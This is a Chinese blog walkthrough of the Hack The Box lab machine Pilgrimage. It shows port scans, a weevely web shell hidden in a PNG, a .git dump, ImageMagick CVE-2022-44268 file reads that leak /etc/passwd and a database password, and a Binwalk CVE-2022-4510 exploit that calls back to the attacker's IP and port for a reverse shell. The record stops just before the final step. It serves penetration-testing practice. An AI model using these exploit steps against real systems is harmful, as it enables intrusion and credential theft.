<h2 id="8-Pilgrimage-CVE-2022-44268"><a href="#8-Pilgrimage-CVE-2022-44268" class="headerlink" title="8.Pilgrimage(CVE-2022-44268)"></a>8.Pilgrimage(CVE-2022-44268)</h2><h3 id="user-3"><a href="#user-3" class="headerlink" title="user"></a>user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">端口扫描</span></span><br><span class="line">nmap -sT --min-rate 10000 -p- 10.10.11.219   </span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.219</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 55302 closed tcp ports (conn-refused), 10231 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap详细信息，这里加了Pn，否则不让ping</span></span><br><span class="line">nmap -sT -sV -sC -O -p22,80 -Pn 10.10.11.219</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds</span><br><span class="line">                                                               </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里说太多了</span></span><br><span class="line">... -oA test.nmap里吧</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)</span><br><span class="line">|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)</span><br><span class="line">|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://pilgrimage.htb/</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005154532764.png"></p>
<p>首页是个图片上传</p>
<p>还有登录和注册功能</p>
<p>盲猜是想办法知道图片上传路径，去访问文件，达到利用的目的</p>
<p>这个注册比较简单，输入用户名和密码即可</p>
<p>然后上传个文件，看看效果，这里随便上传一个正常的截屏文件</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005161606030.png"></p>
<p>上传到shrunk路径下，且重命名</p>
<p>抓个包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------426938590926949349143061348325</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;toConvert&quot;; filename=&quot;1.png&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PNG</span><br><span class="line"></span><br><span class="line">...一乱码</span><br></pre></td></tr></table></figure>

<p>上传一个文档，但重命名为1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------23687293029136119212428719914</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;toConvert&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传失败，应该有内容检测机制</p>
<p>上传了一个图片码上去，成功了</p>
<p>但是linux，有蚁剑咩？</p>
<p>哦，有个自带的weevely文件，是php后门的，连接上传的木马后呢，有问题</p>
<p>，因为是图片格式的，貌似解析不了</p>
<p>截断呢？</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005171215481.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">─# weevely generate shell muma.php                              </span><br><span class="line">Generated &#x27;muma.php&#x27; with password &#x27;shell&#x27; of 761 byte size.</span><br><span class="line"></span><br><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# cat /root/桌面/1.png muma.php &gt; picmuma.png</span><br><span class="line"></span><br><span class="line">weevely 连接图片马，也不行</span><br></pre></td></tr></table></figure>

<p>那还是尝试下，目录爆破吧</p>
<p>dirb扫的很慢，它扫到了一个&#x2F;.git&#x2F;HEAD</p>
<p>后面HEAD没用，访问..&#x2F;.git时，出现禁止访问，说明这个目录是存在的</p>
<p>尝试下载.git文件，用到<a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper"><code>git-dumper工具</code></a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pip install git-dumper #安装</span><br><span class="line"></span><br><span class="line">git-dumper http://pilgrimage.htb/.git pilg   #使用，将下载到的内容放到pilg文件夹里</span><br><span class="line"></span><br><span class="line">─(root㉿kali)-[~]</span><br><span class="line">└─# cd pilg                                        </span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~/pilg]</span><br><span class="line">└─# ls</span><br><span class="line">assets  dashboard.php  index.php  login.php  logout.php  register.php  vendor</span><br><span class="line"></span><br><span class="line">cat index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;assets/bulletproof.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAuthenticated</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnUsername</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;\&quot;&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Bulletproof\Image</span>(<span class="variable">$_FILES</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$image</span>[<span class="string">&quot;toConvert&quot;</span>]) &#123;</span><br><span class="line">    <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">setLocation</span>(<span class="string">&quot;/var/www/pilgrimage.htb/tmp&quot;</span>);</span><br><span class="line">    <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">setSize</span>(<span class="number">100</span>, <span class="number">4000000</span>);</span><br><span class="line">    <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">setMime</span>(<span class="keyword">array</span>(<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>));</span><br><span class="line">    <span class="variable">$upload</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$upload</span>) &#123;</span><br><span class="line">      <span class="variable">$mime</span> = <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">      <span class="variable">$imagePath</span> = <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getFullPath</span>();</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$imagePath</span>) === <span class="string">&quot;image/jpeg&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$mime</span> = <span class="string">&quot;.jpeg&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$newname</span> = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">      <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot;</span> . <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getName</span>() . <span class="variable">$mime</span> . <span class="string">&quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot;</span> . <span class="variable">$newname</span> . <span class="variable">$mime</span>);</span><br><span class="line">      <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getFullPath</span>());</span><br><span class="line">      <span class="variable">$upload_path</span> = <span class="string">&quot;http://pilgrimage.htb/shrunk/&quot;</span> . <span class="variable">$newname</span> . <span class="variable">$mime</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:/var/db/pilgrimage&#x27;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="variable">$upload_path</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;toConvert&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?message=&quot;</span> . <span class="variable">$upload_path</span> . <span class="string">&quot;&amp;status=success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?message=Image shrink failed&amp;status=fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?message=Image shrink failed&amp;status=fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    html</span><br></pre></td></tr></table></figure>

<p>我们知道了db</p>
<p><code>   $db = new PDO(&#39;sqlite:/var/db/pilgrimage&#39;);</code></p>
<p>知道访问了个&#x2F;magick convert，使得上传的图片被缩小了50%</p>
<p>浏览访问..&#x2F;magic，可以下载下来，应该可以查看版本吧(不下了，太慢了)，然后发现这个是有漏洞的</p>
<p><a target="_blank" rel="noopener" href="http://zeo.cool/2023/02/12/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2022-44268)/">ImageMagick任意文件读取漏洞(CVE-2022-44268)参考1</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2235689">读取漏洞参考2</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">poc利用下载</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">python3 cve.py -f &quot;/etc/passwd&quot; -o exp.png                                        </span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com&gt;</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] Generating Blank PNG</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] Blank PNG generated</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] Placing Payload to <span class="built_in">read</span> /etc/passwd</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] PoC PNG generated &gt; exp.png</span></span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# exiftool exp.png          </span><br><span class="line">ExifTool Version Number         : 12.49</span><br><span class="line">File Name                       : exp.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 1233 bytes</span><br><span class="line">File Modification Date/Time     : 2023:10:05 19:12:11+08:00</span><br><span class="line">File Access Date/Time           : 2023:10:05 19:12:11+08:00</span><br><span class="line">File Inode Change Date/Time     : 2023:10:05 19:12:11+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image/png</span><br><span class="line">Image Width                     : 255</span><br><span class="line">Image Height                    : 255</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB</span><br><span class="line">Compression                     : Deflate/Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Profile                         : /etc/passwd</span><br><span class="line">Image Size                      : 255x255</span><br><span class="line">Megapixels                      : 0.065</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">看，添加了一个属性，Profile     : /etc/passwd</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传它</p>
<p>然后，kali 用wget命令，下载那个上传后的链接</p>
<p><code>exiftool 那个.png /b</code></p>
<blockquote>
<p>显示一堆十六进制数，复制</p>
</blockquote>
<p>用<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a>，复制过去，点击 <code>from Hex</code></p>
<p>出现</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005192235012.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">7root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:109::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">emily:x:1000:1000:emily,,,:/home/emily:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>大致一看，有bin&#x2F;bash的，除了root，就<code>emily</code>了</p>
<p>然后账号有了，还要密码嘞</p>
<p>密码在数据库里</p>
<p>已经知道了位置即，<code>/var/db/pilgrimage</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python3 cve.py -f &quot;/var/db/pilgrimage&quot; -o exp2.png</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com&gt;</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] Generating Blank PNG</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] Blank PNG generated</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] Placing Payload to <span class="built_in">read</span> /var/db/pilgrimage</span></span><br><span class="line"><span class="meta prompt_">   [&gt;</span><span class="language-bash">] PoC PNG generated &gt; exp2.png</span></span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# wget http://pilgrimage.htb/shrunk/651e9d3d1344a.png</span><br><span class="line">--2023-10-05 19:26:20--  http://pilgrimage.htb/shrunk/651e9d3d1344a.png</span><br><span class="line">正在解析主机 pilgrimage.htb (pilgrimage.htb)... 10.10.11.219</span><br><span class="line">正在连接 pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：1854 (1.8K) [image/png]</span><br><span class="line">正在保存至: “651e9d3d1344a.png”</span><br><span class="line"></span><br><span class="line">651e9d3d1344a.png       100%[==============================&gt;]   1.81K  --.-KB/s  用时 0s   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exiftool .png -b</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005192939409.png"></p>
<p>2-emilyabigchonkyboi123</p>
<p>直接ssh连接后</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">emily@pilgrimage:~$ ls -a</span><br><span class="line">.   .bash_history  .bashrc              .config     .gitconfig  .profile</span><br><span class="line">..  .bash_logout   binwalk_exploit.png  exploit.py  .local      user.txt</span><br><span class="line">emily@pilgrimage:~$ cat user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="root-3"><a href="#root-3" class="headerlink" title="root"></a>root</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">emily@pilgrimage:~$ sudo -l</span><br><span class="line">[sudo] password for emily: </span><br><span class="line">Sorry, user emily may not run sudo on pilgrimage.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我看到了，有一个exploit.py，这应该是别人传上来的，内容是命令执行漏洞</p>
<p>大佬的做法是上传一个pspy64文件，这个文件启动后，可以监听linux后台的程序</p>
<p>大佬发现了后台工作的一个文件</p>
<p>找到了一个&#x2F;var&#x2F;sbin&#x2F;malwarescan.sh文件</p>
<p>这个很慢啊，大众环境，被玩坏哩</p>
<p>看一下该脚本内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231005200049940.png"></p>
<p>inotifywait创建文件夹，用binwalk读文件</p>
<p>看下这个binwalk</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">emily@pilgrimage:/usr/sbin$ cd /usr/local/bin/</span><br><span class="line">emily@pilgrimage:/usr/local/bin$ binwalk</span><br><span class="line"></span><br><span class="line">Binwalk v2.3.2</span><br><span class="line">Craig Heffner, ReFirmLabs</span><br><span class="line">https://github.com/ReFirmLabs/binwalk</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>哦，谷歌一下 <code>Binwalk v2.3.2</code>，有一个<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51249">命令执行漏洞</a>，怪不得</p>
<p>下载好poc</p>
<p>攻击者终端上：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python3 exp3.py 1.png 10.10.14.53 4444 #有一个现成的png，设置攻击者ip，即端口(监听用)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成了个隐藏图片，我重命名为了exxxp.png</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################</span></span></span><br><span class="line">------------------CVE-2022-4510----------------</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################</span></span></span><br><span class="line">--------Binwalk Remote Command Execution--------</span><br><span class="line">------Binwalk 2.1.2b through 2.3.2 included-----</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################</span></span></span><br><span class="line">----------Exploit by: Etienne Lacoche-----------</span><br><span class="line">---------Contact Twitter: @electr0sm0g----------</span><br><span class="line">------------------Discovered by:----------------</span><br><span class="line">---------Q. Kaiser, ONEKEY Research Lab---------</span><br><span class="line">---------Exploit tested on debian 11------------</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You can now rename and share binwalk_exploit and start your local netcat listener.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传文件</span></span><br><span class="line">scp exxxp.png emily@10.10.11.219:/home/emily</span><br><span class="line"></span><br><span class="line">emily@10.10.11.219&#x27;s password: </span><br><span class="line">exxxp.png   100% 9374    12.2KB/s   00:00 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">监听</span></span><br><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>

<p>emily终端上：</p>
